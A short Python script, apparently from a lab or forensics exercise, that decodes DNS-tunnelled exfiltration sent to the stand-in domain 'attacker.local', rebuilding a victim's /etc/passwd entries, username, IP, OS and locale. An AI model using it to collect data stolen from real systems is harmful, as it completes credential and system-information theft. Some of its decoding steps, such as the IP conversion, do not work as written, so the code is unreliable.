# DNS Tunneling Decoder
# Extracts system info embedded in DNS queries

import re

# Input log file (must exist in same folder)
PCAP_LOG_FILE = "dns_queries.txt"

# Store decoded info
decoded = {
    "passwd": [],
    "user": None,
    "ip": None,
    "os": None,
    "locale": []
}

# Step 1: Load lines from DNS capture
with open(PCAP_LOG_FILE, 'r') as f:
    lines = f.readlines()

# Step 2: Parse DNS A? queries
for line in lines:
    if " A? " not in line:
        continue

    match = re.search(r"A\?\s+([^\s]+)", line)
    if not match:
        continue

    query = match.group(1)

    if query.endswith(".attacker.local."):
        query = query[:-len(".attacker.local.")]
    if query.startswith("www."):
        query = query[4:]

    parts = query.split("_", 1)
    if len(parts) != 2:
        continue

    key = parts[0]
    value = parts[1]

    # Restore encoded separators
    value = value.replace("-", ":")

    # Assign value
    if key == "passwd":
        decoded["passwd"].append(value)
    elif key == "user":
        decoded["user"] = value
    elif key == "ip":
        decoded["ip"] = value.replace("-", ".")
    elif key == "os":
        decoded["os"] = value
    elif key.startswith("locale"):
        decoded["locale"].append(value)

# Step 3: Convert passwd format into proper lines
def format_passwd(entry):
    cleaned = entry.replace("_", "/").replace(",", "").replace("-", ":")
    parts = cleaned.split(":")
    while len(parts) < 7:
        parts.append("")
    return ":".join(parts[:7])

formatted_passwd = [format_passwd(e.replace("/", ":")) for e in decoded["passwd"]]

# Step 4: Decide output filename dynamically
identity = decoded.get("hostname") or decoded.get("ip") or decoded.get("user") or "unknown"
safe_identity = identity.replace(":", ".").replace("/", "_")
output_filename = f"{safe_identity}.txt"

# Step 5: Write the decoded result
with open(output_filename, "w") as out:
    out.write("=== Decoded System Info ===\n\n")
    out.write(f"[User]\n{decoded['user']}\n\n")
    out.write(f"[IP Address]\n{decoded['ip']}\n\n")
    out.write(f"[OS Version]\n{decoded['os']}\n\n")
    out.write(f"[Locale]\n" + "\n".join(decoded["locale"]) + "\n\n")
    out.write("[/etc/passwd Extracted]\n" + "\n".join(formatted_passwd) + "\n")

print(f"[+] Decoding complete. Saved to {output_filename}")
